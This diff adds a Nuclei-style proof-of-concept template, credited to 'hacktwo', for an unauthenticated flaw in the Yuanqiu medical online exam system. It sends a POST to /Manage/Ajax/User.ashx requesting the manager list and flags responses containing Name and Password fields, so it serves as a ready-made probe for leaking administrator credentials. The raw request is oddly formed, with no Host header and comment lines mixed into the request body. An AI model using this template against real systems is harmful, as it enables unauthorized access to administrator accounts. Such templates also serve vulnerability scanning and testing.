@@ -1,0 +1,57 @@
+id: poc-cnslmz45l4iy3edi
+info:
+  name: 远秋医学在线考试系统任意用户登录漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cnslmz45l4iy3edi'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cnslmz45l4iy3edi
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /Manage/Ajax/User.ashx/ HTTP/1.1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    oper=getManagerList&name=&code=&depart=&page=1&rows=15
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?Name)(?=.*?Password).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
